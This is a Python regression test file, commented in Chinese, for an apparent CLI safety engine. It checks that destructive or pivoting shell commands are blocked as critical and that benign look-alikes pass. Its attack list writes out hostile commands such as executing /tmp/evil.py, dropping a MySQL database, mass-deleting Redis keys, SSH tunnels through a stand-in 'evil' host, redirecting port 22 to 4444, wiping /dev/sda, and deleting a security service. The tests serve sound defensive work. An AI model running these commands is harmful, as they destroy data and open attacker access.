"""safety 引擎红队自查回归测试 (第九轮, 2026-11-03, Gap-2026-11f)。

本文件固化 2026-11-03 新增的攻击面拦截规则, 防止回退:
1. 解释器混淆执行 (python exec 文件内容 / eval 用户输入)。
2. 数据库破坏 (mysqladmin drop / redis-cli KEYS|xargs DEL)。
3. 网络转向与阻断 (iptables DROP/REDIRECT/DNAT / nft drop / ssh -L/-R 0.0.0.0)。
4. 磁盘擦除 (hdparm --security-erase)。
5. Windows 服务不可逆删除 (sc delete)。

同时覆盖: 常见良性命令 (python print / iptables -L / -j ACCEPT / nft list /
ssh -L localhost / hdparm -I / sc query|stop / redis-cli GET) 不得被误判为 critical。
"""
from tuan_cli.ext.safety_engine import SafetyEngine, is_redline

_ENGINE = SafetyEngine()

_ATTACK = [
    # ---- ① 解释器混淆执行 ----
    "python -c \"exec(open('/tmp/evil.py').read())\"",
    "python -c \"eval(input())\"",
    "python -c \"exec(compile('import os','x','exec'))\"",
    # ---- ② 数据库破坏 ----
    "mysqladmin -u root drop app",
    "redis-cli KEYS '*' | xargs redis-cli DEL",
    # ---- ③ 网络转向与阻断 ----
    "iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 4444",
    "iptables -A FORWARD -j DROP",
    "iptables -P FORWARD DROP",
    "nft add rule ip filter OUTPUT drop",
    "ssh -L 0.0.0.0:3306:evil:3306 user@jump",
    "ssh -R 0.0.0.0:22:localhost:22 user@evil",
    # ---- ④ 磁盘擦除 ----
    "hdparm --security-erase x /dev/sda",
    # ---- ⑤ Windows 服务删除 ----
    "sc delete SecurityService",
]


def test_attack_payloads_blocked_critical():
    for cmd in _ATTACK:
        res = _ENGINE.score({"command": cmd})
        assert res["block"] is True, f"应 block=True: {cmd!r} -> {res}"
        assert res["risk"] == "critical", f"应 critical: {cmd!r} -> {res}"
        assert is_redline(cmd), f"is_redline 应命中: {cmd!r}"


_BENIGN = [
    # 解释器正常执行
    'python -c "print(1+1)"',
    'python -c "import os;print(os.getcwd())"',
    # 数据库查询
    'mysql -e "SELECT * FROM users"',
    'psql -c "SELECT 1"',
    'sqlite3 db ".tables"',
    "redis-cli GET key",
    # 防火墙只读 / 放行
    "iptables -L",
    "iptables -A INPUT -j ACCEPT",
    "nft list ruleset",
    # ssh 回环转发
    "ssh -L 8080:localhost:80 user@host",
    # 磁盘只读信息
    "hdparm -I /dev/sda",
    "blkid /dev/sda1",
    # Windows 服务查询/停止 (可恢复)
    "sc query SecurityService",
    "sc stop SecurityService",
]


def test_benign_commands_not_critical():
    for cmd in _BENIGN:
        res = _ENGINE.score({"command": cmd})
        assert res["risk"] != "critical", f"良性命令不得 critical: {cmd!r} -> {res}"
        assert res["block"] is False, f"不应 block: {cmd!r} -> {res}"
